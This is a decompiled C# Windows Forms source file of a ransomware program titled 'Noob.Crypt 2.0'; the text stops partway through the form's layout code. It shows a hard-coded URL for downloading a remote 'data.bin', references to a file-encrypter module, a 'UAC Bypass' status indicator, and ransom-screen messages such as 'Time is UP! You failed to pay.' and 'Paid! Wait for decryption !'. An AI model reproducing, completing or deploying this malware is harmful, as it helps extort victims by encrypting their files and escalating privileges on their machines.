using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using NoobCrypt2._0.FileEncrypter;
using NoobCrypt2._0.My;
using NoobCrypt2._0.My.Resources;

namespace NoobCrypt2._0;

[DesignerGenerated]
public class Form1 : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	[AccessedThroughProperty("NsTheme1")]
	private NSTheme _NsTheme1;

	[AccessedThroughProperty("NsGroupBox1")]
	private NSGroupBox _NsGroupBox1;

	[AccessedThroughProperty("NsLabel2")]
	private NSLabel _NsLabel2;

	[AccessedThroughProperty("NsLabel1")]
	private NSLabel _NsLabel1;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("Label2")]
	private Label _Label2;

	[AccessedThroughProperty("BackgroundWorker1")]
	private BackgroundWorker _BackgroundWorker1;

	[AccessedThroughProperty("PictureBox1")]
	private PictureBox _PictureBox1;

	[AccessedThroughProperty("Label5")]
	private Label _Label5;

	[AccessedThroughProperty("Label4")]
	private Label _Label4;

	[AccessedThroughProperty("NsGroupBox2")]
	private NSGroupBox _NsGroupBox2;

	[AccessedThroughProperty("Label6")]
	private Label _Label6;

	[AccessedThroughProperty("Label7")]
	private Label _Label7;

	[AccessedThroughProperty("NsSeperator1")]
	private NSSeperator _NsSeperator1;

	[AccessedThroughProperty("Label10")]
	private Label _Label10;

	[AccessedThroughProperty("Label8")]
	private Label _Label8;

	[AccessedThroughProperty("NsTextBox1")]
	private NSTextBox _NsTextBox1;

	[AccessedThroughProperty("Label9")]
	private Label _Label9;

	[AccessedThroughProperty("NsButton2")]
	private NSButton _NsButton2;

	[AccessedThroughProperty("Label11")]
	private Label _Label11;

	[AccessedThroughProperty("NsLabel3")]
	private NSLabel _NsLabel3;

	[AccessedThroughProperty("Label13")]
	private Label _Label13;

	[AccessedThroughProperty("Label12")]
	private Label _Label12;

	[AccessedThroughProperty("BackgroundWorker2")]
	private BackgroundWorker _BackgroundWorker2;

	[AccessedThroughProperty("NsGroupBox3")]
	private NSGroupBox _NsGroupBox3;

	[AccessedThroughProperty("Label18")]
	private Label _Label18;

	[AccessedThroughProperty("Label16")]
	private Label _Label16;

	[AccessedThroughProperty("Label15")]
	private Label _Label15;

	[AccessedThroughProperty("Label14")]
	private Label _Label14;

	[AccessedThroughProperty("Label3")]
	private Label _Label3;

	[AccessedThroughProperty("Label20")]
	private Label _Label20;

	[AccessedThroughProperty("Label19")]
	private Label _Label19;

	[AccessedThroughProperty("Label22")]
	private Label _Label22;

	[AccessedThroughProperty("Label21")]
	private Label _Label21;

	[AccessedThroughProperty("Label17")]
	private Label _Label17;

	[AccessedThroughProperty("NsTextBox2")]
	private Label _NsTextBox2;

	[AccessedThroughProperty("Label23")]
	private Label _Label23;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[AccessedThroughProperty("Label24")]
	private Label _Label24;

	[AccessedThroughProperty("BackgroundWorker3")]
	private BackgroundWorker _BackgroundWorker3;

	private int aakam;

	private string URLtoFile;

	private string FilePath;

	private string[] UsableChars;

	private Random RandomClass;

	private object CharsList;

	private string Fp;

	private string Fp2;

	private int Number;

	internal virtual Timer Timer1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (_Timer1 != null)
			{
				_Timer1.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.add_Tick(eventHandler);
			}
		}
	}

	internal virtual NSTheme NsTheme1
	{
		[DebuggerNonUserCode]
		get
		{
			return _NsTheme1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = NsTheme1_Click;
			if (_NsTheme1 != null)
			{
				((Control)_NsTheme1).remove_Click(eventHandler);
			}
			_NsTheme1 = value;
			if (_NsTheme1 != null)
			{
				((Control)_NsTheme1).add_Click(eventHandler);
			}
		}
	}

	internal virtual NSGroupBox NsGroupBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _NsGroupBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_NsGroupBox1 = value;
		}
	}

	internal virtual NSLabel NsLabel2
	{
		[DebuggerNonUserCode]
		get
		{
			return _NsLabel2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_NsLabel2 = value;
		}
	}

	internal virtual NSLabel NsLabel1
	{
		[DebuggerNonUserCode]
		get
		{
			return _NsLabel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_NsLabel1 = value;
		}
	}

	internal virtual Label Label1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual Label Label2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label2 = value;
		}
	}

	internal virtual BackgroundWorker BackgroundWorker1
	{
		[DebuggerNonUserCode]
		get
		{
			return _BackgroundWorker1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			DoWorkEventHandler value2 = BackgroundWorker1_DoWork;
			RunWorkerCompletedEventHandler value3 = BackgroundWorker1_RunWorkerCompleted;
			if (_BackgroundWorker1 != null)
			{
				_BackgroundWorker1.DoWork -= value2;
				_BackgroundWorker1.RunWorkerCompleted -= value3;
			}
			_BackgroundWorker1 = value;
			if (_BackgroundWorker1 != null)
			{
				_BackgroundWorker1.DoWork += value2;
				_BackgroundWorker1.RunWorkerCompleted += value3;
			}
		}
	}

	internal virtual PictureBox PictureBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _PictureBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_PictureBox1 = value;
		}
	}

	internal virtual Label Label5
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label5 = value;
		}
	}

	internal virtual Label Label4
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label4 = value;
		}
	}

	internal virtual NSGroupBox NsGroupBox2
	{
		[DebuggerNonUserCode]
		get
		{
			return _NsGroupBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_NsGroupBox2 = value;
		}
	}

	internal virtual Label Label6
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Label6_Click;
			if (_Label6 != null)
			{
				((Control)_Label6).remove_Click(eventHandler);
			}
			_Label6 = value;
			if (_Label6 != null)
			{
				((Control)_Label6).add_Click(eventHandler);
			}
		}
	}

	internal virtual Label Label7
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label7 = value;
		}
	}

	internal virtual NSSeperator NsSeperator1
	{
		[DebuggerNonUserCode]
		get
		{
			return _NsSeperator1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = NsSeperator1_Click;
			if (_NsSeperator1 != null)
			{
				((Control)_NsSeperator1).remove_Click(eventHandler);
			}
			_NsSeperator1 = value;
			if (_NsSeperator1 != null)
			{
				((Control)_NsSeperator1).add_Click(eventHandler);
			}
		}
	}

	internal virtual Label Label10
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label10;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label10 = value;
		}
	}

	internal virtual Label Label8
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label8 = value;
		}
	}

	internal virtual NSTextBox NsTextBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _NsTextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_NsTextBox1 = value;
		}
	}

	internal virtual Label Label9
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label9;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label9 = value;
		}
	}

	internal virtual NSButton NsButton2
	{
		[DebuggerNonUserCode]
		get
		{
			return _NsButton2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = NsButton2_Click;
			if (_NsButton2 != null)
			{
				((Control)_NsButton2).remove_Click(eventHandler);
			}
			_NsButton2 = value;
			if (_NsButton2 != null)
			{
				((Control)_NsButton2).add_Click(eventHandler);
			}
		}
	}

	internal virtual Label Label11
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label11;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label11 = value;
		}
	}

	internal virtual NSLabel NsLabel3
	{
		[DebuggerNonUserCode]
		get
		{
			return _NsLabel3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_NsLabel3 = value;
		}
	}

	internal virtual Label Label13
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label13;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label13 = value;
		}
	}

	internal virtual Label Label12
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label12;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label12 = value;
		}
	}

	internal virtual BackgroundWorker BackgroundWorker2
	{
		[DebuggerNonUserCode]
		get
		{
			return _BackgroundWorker2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			RunWorkerCompletedEventHandler value2 = BackgroundWorker2_RunWorkerCompleted;
			DoWorkEventHandler value3 = BackgroundWorker2_DoWork;
			if (_BackgroundWorker2 != null)
			{
				_BackgroundWorker2.RunWorkerCompleted -= value2;
				_BackgroundWorker2.DoWork -= value3;
			}
			_BackgroundWorker2 = value;
			if (_BackgroundWorker2 != null)
			{
				_BackgroundWorker2.RunWorkerCompleted += value2;
				_BackgroundWorker2.DoWork += value3;
			}
		}
	}

	internal virtual NSGroupBox NsGroupBox3
	{
		[DebuggerNonUserCode]
		get
		{
			return _NsGroupBox3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_NsGroupBox3 = value;
		}
	}

	internal virtual Label Label18
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label18;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label18 = value;
		}
	}

	internal virtual Label Label16
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label16;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label16 = value;
		}
	}

	internal virtual Label Label15
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label15;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label15 = value;
		}
	}

	internal virtual Label Label14
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label14;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label14 = value;
		}
	}

	internal virtual Label Label3
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label3 = value;
		}
	}

	internal virtual Label Label20
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label20;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label20 = value;
		}
	}

	internal virtual Label Label19
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label19;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label19 = value;
		}
	}

	internal virtual Label Label22
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label22;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label22 = value;
		}
	}

	internal virtual Label Label21
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label21;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label21 = value;
		}
	}

	internal virtual Label Label17
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label17;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label17 = value;
		}
	}

	internal virtual Label NsTextBox2
	{
		[DebuggerNonUserCode]
		get
		{
			return _NsTextBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_NsTextBox2 = value;
		}
	}

	internal virtual Label Label23
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label23;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label23 = value;
		}
	}

	internal virtual Button Button1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Button1_Click;
			if (_Button1 != null)
			{
				((Control)_Button1).remove_Click(eventHandler);
			}
			_Button1 = value;
			if (_Button1 != null)
			{
				((Control)_Button1).add_Click(eventHandler);
			}
		}
	}

	internal virtual Label Label24
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label24;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label24 = value;
		}
	}

	internal virtual BackgroundWorker BackgroundWorker3
	{
		[DebuggerNonUserCode]
		get
		{
			return _BackgroundWorker3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			RunWorkerCompletedEventHandler value2 = BackgroundWorker3_RunWorkerCompleted;
			DoWorkEventHandler value3 = BackgroundWorker3_DoWork;
			if (_BackgroundWorker3 != null)
			{
				_BackgroundWorker3.RunWorkerCompleted -= value2;
				_BackgroundWorker3.DoWork -= value3;
			}
			_BackgroundWorker3 = value;
			if (_BackgroundWorker3 != null)
			{
				_BackgroundWorker3.RunWorkerCompleted += value2;
				_BackgroundWorker3.DoWork += value3;
			}
		}
	}

	public Form1()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Expected O, but got Unknown
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		__ENCAddToList(this);
		URLtoFile = "http://vreaucoduripentrujocuri.com/data.bin";
		FilePath = "C:\\";
		RandomClass = new Random();
		CharsList = "A,B,C,D,E,F,G,H,J,K,a,b,c,d,e,f,g,h,j,k,1,2,3,4,5,6,7,8,9,0";
		Fp = "";
		Fp2 = "";
		Number = 0;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Expected O, but got Unknown
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bb: Expected O, but got Unknown
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Expected O, but got Unknown
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dc: Expected O, but got Unknown
		//IL_00dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e7: Expected O, but got Unknown
		//IL_00e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f2: Expected O, but got Unknown
		//IL_0109: Unknown result type (might be due to invalid IL or missing references)
		//IL_0113: Expected O, but got Unknown
		//IL_0114: Unknown result type (might be due to invalid IL or missing references)
		//IL_011e: Expected O, but got Unknown
		//IL_011f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0129: Expected O, but got Unknown
		//IL_012a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0134: Expected O, but got Unknown
		//IL_0140: Unknown result type (might be due to invalid IL or missing references)
		//IL_014a: Expected O, but got Unknown
		//IL_014b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0155: Expected O, but got Unknown
		//IL_0161: Unknown result type (might be due to invalid IL or missing references)
		//IL_016b: Expected O, but got Unknown
		//IL_016c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0176: Expected O, but got Unknown
		//IL_0182: Unknown result type (might be due to invalid IL or missing references)
		//IL_018c: Expected O, but got Unknown
		//IL_0198: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a2: Expected O, but got Unknown
		//IL_01a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ad: Expected O, but got Unknown
		//IL_01c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ce: Expected O, but got Unknown
		//IL_01cf: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d9: Expected O, but got Unknown
		//IL_0403: Unknown result type (might be due to invalid IL or missing references)
		//IL_040d: Expected O, but got Unknown
		//IL_04ff: Unknown result type (might be due to invalid IL or missing references)
		//IL_0509: Expected O, but got Unknown
		//IL_05b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_05c3: Expected O, but got Unknown
		//IL_0657: Unknown result type (might be due to invalid IL or missing references)
		//IL_0661: Expected O, but got Unknown
		//IL_0d55: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d5f: Expected O, but got Unknown
		//IL_10ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_10b8: Expected O, but got Unknown
		//IL_1280: Unknown result type (might be due to invalid IL or missing references)
		//IL_128a: Expected O, but got Unknown
		//IL_13f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_13fe: Expected O, but got Unknown
		//IL_160a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1614: Expected O, but got Unknown
		//IL_178f: Unknown result type (might be due to invalid IL or missing references)
		//IL_1799: Expected O, but got Unknown
		//IL_1826: Unknown result type (might be due to invalid IL or missing references)
		//IL_1830: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		Timer1 = new Timer(components);
		BackgroundWorker1 = new BackgroundWorker();
		BackgroundWorker2 = new BackgroundWorker();
		NsTheme1 = new NSTheme();
		Label24 = new Label();
		Label23 = new Label();
		NsTextBox2 = new Label();
		NsGroupBox3 = new NSGroupBox();
		Label22 = new Label();
		Label21 = new Label();
		Label17 = new Label();
		Label20 = new Label();
		Label19 = new Label();
		Label18 = new Label();
		Label16 = new Label();
		Label15 = new Label();
		Label14 = new Label();
		Label3 = new Label();
		Label9 = new Label();
		NsButton2 = new NSButton();
		NsGroupBox2 = new NSGroupBox();
		Label13 = new Label();
		Label12 = new Label();
		Label8 = new Label();
		Label6 = new Label();
		NsTextBox1 = new NSTextBox();
		Label4 = new Label();
		Label10 = new Label();
		NsSeperator1 = new NSSeperator();
		Label7 = new Label();
		Label5 = new Label();
		NsGroupBox1 = new NSGroupBox();
		Label11 = new Label();
		NsLabel3 = new NSLabel();
		Label2 = new Label();
		Label1 = new Label();
		NsLabel2 = new NSLabel();
		NsLabel1 = new NSLabel();
		PictureBox1 = new PictureBox();
		Button1 = new Button();
		BackgroundWorker3 = new BackgroundWorker();
		((Control)NsTheme1).SuspendLayout();
		((Control)NsGroupBox3).SuspendLayout();
		((Control)NsGroupBox2).SuspendLayout();
		((Control)NsGroupBox1).SuspendLayout();
		((ISupportInitialize)PictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		NsTheme1.AccentOffset = 42;
		NsTheme1.BackColor = Color.FromArgb(50, 50, 50);
		NsTheme1.BorderStyle = (FormBorderStyle)0;
		NsTheme1.Colors = new Bloom[0];
		((Control)NsTheme1).get_Controls().Add((Control)(object)Label24);
		((Control)NsTheme1).get_Controls().Add((Control)(object)Label23);
		((Control)NsTheme1).get_Controls().Add((Control)(object)NsTextBox2);
		((Control)NsTheme1).get_Controls().Add((Control)(object)NsGroupBox3);
		((Control)NsTheme1).get_Controls().Add((Control)(object)Label9);
		((Control)NsTheme1).get_Controls().Add((Control)(object)NsButton2);
		((Control)NsTheme1).get_Controls().Add((Control)(object)NsGroupBox2);
		((Control)NsTheme1).get_Controls().Add((Control)(object)Label6);
		((Control)NsTheme1).get_Controls().Add((Control)(object)NsTextBox1);
		((Control)NsTheme1).get_Controls().Add((Control)(object)Label4);
		((Control)NsTheme1).get_Controls().Add((Control)(object)Label10);
		((Control)NsTheme1).get_Controls().Add((Control)(object)NsSeperator1);
		((Control)NsTheme1).get_Controls().Add((Control)(object)Label7);
		((Control)NsTheme1).get_Controls().Add((Control)(object)Label5);
		((Control)NsTheme1).get_Controls().Add((Control)(object)NsGroupBox1);
		((Control)NsTheme1).get_Controls().Add((Control)(object)PictureBox1);
		((Control)NsTheme1).get_Controls().Add((Control)(object)Button1);
		NsTheme1.Customization = "";
		NsTheme1.Dock = (DockStyle)5;
		NsTheme1.Font = new Font("Verdana", 8f);
		NsTheme1.Image = null;
		NSTheme nsTheme = NsTheme1;
		Point location = new Point(0, 0);
		((Control)nsTheme).set_Location(location);
		NsTheme1.Movable = true;
		((Control)NsTheme1).set_Name("NsTheme1");
		NsTheme1.NoRounding = false;
		NsTheme1.Sizable = true;
		NSTheme nsTheme2 = NsTheme1;
		Size size = new Size(876, 509);
		((Control)nsTheme2).set_Size(size);
		NsTheme1.SmartBounds = true;
		NsTheme1.StartPosition = (FormStartPosition)1;
		((Control)NsTheme1).set_TabIndex(0);
		NsTheme1.Text = "Noob.Crypt 2.0";
		NsTheme1.TransparencyKey = Color.Empty;
		NsTheme1.Transparent = false;
		Label24.set_AutoSize(true);
		((Control)Label24).set_Cursor(Cursors.get_Hand());
		((Control)Label24).set_Font(new Font("Verdana", 24f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label24).set_ForeColor(Color.White);
		Label label = Label24;
		location = new Point(181, 271);
		((Control)label).set_Location(location);
		((Control)Label24).set_Name("Label24");
		Label label2 = Label24;
		size = new Size(486, 38);
		((Control)label2).set_Size(size);
		((Control)Label24).set_TabIndex(23);
		Label24.set_Text("Time is UP! You failed to pay.");
		((Control)Label24).set_Visible(false);
		Label23.set_AutoSize(true);
		((Control)Label23).set_Cursor(Cursors.get_Hand());
		((Control)Label23).set_Font(new Font("Verdana", 24f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label23).set_ForeColor(Color.White);
		Label label3 = Label23;
		location = new Point(221, 271);
		((Control)label3).set_Location(location);
		((Control)Label23).set_Name("Label23");
		Label label4 = Label23;
		size = new Size(438, 38);
		((Control)label4).set_Size(size);
		((Control)Label23).set_TabIndex(21);
		Label23.set_Text("Paid! Wait for decryption !");
		NsTextBox2.set_AutoSize(true);
		((Control)NsTextBox2).set_Font(new Font("Arial Rounded MT Bold", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)NsTextBox2).set_ForeColor(Color.Red);
		Label nsTextBox = NsTextBox2;
		location = new Point(636, 462);
		((Control)nsTextBox).set_Location(location);
		((Control)NsTextBox2).set_Name("NsTextBox2");
		Label nsTextBox2 = NsTextBox2;
		size = new Size(62, 15);
		((Control)nsTextBox2).set_Size(size);
		((Control)NsTextBox2).set_TabIndex(18);
		NsTextBox2.set_Text("Not Paid");
		((Control)NsGroupBox3).get_Controls().Add((Control)(object)Label22);
		((Control)NsGroupBox3).get_Controls().Add((Control)(object)Label21);
		((Control)NsGroupBox3).get_Controls().Add((Control)(object)Label17);
		((Control)NsGroupBox3).get_Controls().Add((Control)(object)Label20);
		((Control)NsGroupBox3).get_Controls().Add((Control)(object)Label19);
		((Control)NsGroupBox3).get_Controls().Add((Control)(object)Label18);
		((Control)NsGroupBox3).get_Controls().Add((Control)(object)Label16);
		((Control)NsGroupBox3).get_Controls().Add((Control)(object)Label15);
		((Control)NsGroupBox3).get_Controls().Add((Control)(object)Label14);
		((Control)NsGroupBox3).get_Controls().Add((Control)(object)Label3);
		NsGroupBox3.DrawSeperator = false;
		NSGroupBox nsGroupBox = NsGroupBox3;
		location = new Point(676, 204);
		((Control)nsGroupBox).set_Location(location);
		((Control)NsGroupBox3).set_Name("NsGroupBox3");
		NSGroupBox nsGroupBox2 = NsGroupBox3;
		size = new Size(188, 95);
		((Control)nsGroupBox2).set_Size(size);
		NsGroupBox3.SubTitle = "";
		((Control)NsGroupBox3).set_TabIndex(7);
		((Control)NsGroupBox3).set_Text("NsGroupBox3");
		NsGroupBox3.Title = "Security";
		Label22.set_AutoSize(true);
		((Control)Label22).set_ForeColor(Color.FromArgb(0, 192, 0));
		Label label5 = Label22;
		location = new Point(151, 68);
		((Control)label5).set_Location(location);
		((Control)Label22).set_Name("Label22");
		Label label6 = Label22;
		size = new Size(15, 13);
		((Control)label6).set_Size(size);
		((Control)Label22).set_TabIndex(17);
		Label22.set_Text("✓");
		((Control)Label22).set_Visible(false);
		Label21.set_AutoSize(true);
		((Control)Label21).set_ForeColor(Color.Red);
		Label label7 = Label21;
		location = new Point(151, 68);
		((Control)label7).set_Location(location);
		((Control)Label21).set_Name("Label21");
		Label label8 = Label21;
		size = new Size(15, 13);
		((Control)label8).set_Size(size);
		((Control)Label21).set_TabIndex(16);
		Label21.set_Text("X");
		Label17.set_AutoSize(true);
		((Control)Label17).set_ForeColor(Color.White);
		Label label9 = Label17;
		location = new Point(10, 68);
		((Control)label9).set_Location(location);
		((Control)Label17).set_Name("Label17");
		Label label10 = Label17;
		size = new Size(93, 13);
		((Control)label10).set_Size(size);
		((Control)Label17).set_TabIndex(15);
		Label17.set_Text("Encrypted Files");
		Label20.set_AutoSize(true);
		((Control)Label20).set_ForeColor(Color.FromArgb(0, 192, 0));
		Label label11 = Label20;
		location = new Point(151, 55);
		((Control)label11).set_Location(location);
		((Control)Label20).set_Name("Label20");
		Label label12 = Label20;
		size = new Size(15, 13);
		((Control)label12).set_Size(size);
		((Control)Label20).set_TabIndex(14);
		Label20.set_Text("✓");
		Label19.set_AutoSize(true);
		((Control)Label19).set_ForeColor(Color.White);
		Label label13 = Label19;
		location = new Point(10, 55);
		((Control)label13).set_Location(location);
		((Control)Label19).set_Name("Label19");
		Label label14 = Label19;
		size = new Size(77, 13);
		((Control)label14).set_Size(size);
		((Control)Label19).set_TabIndex(13);
		Label19.set_Text("UAC Bypass");
		Label18.set_AutoSize(true);
		((Control)Label18).set_ForeColor(Color.FromArgb(0, 192, 0));
		Label label15 = Label18;
		location = new Point(151, 42);
		((Control)label15).set_Location(location);
		((Control)Label18).set_Name("Label18");
		Label label16 = Label18;
		size = new Size(15, 13);
